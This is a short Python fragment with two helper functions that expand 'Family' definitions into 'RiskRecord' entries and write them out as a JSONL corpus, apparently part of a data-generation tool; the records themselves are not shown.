def generate(families: Sequence[Family] = FAMILIES) -> list[RiskRecord]:
    """Expand every family into records, in declaration order."""
    return [record for family in families for record in family.records()]


def write_corpus(path: Path | str, families: Sequence[Family] = FAMILIES) -> int:
    """Generate the corpus and write it as JSONL. Returns the row count."""
    return write_jsonl(path, generate(families))
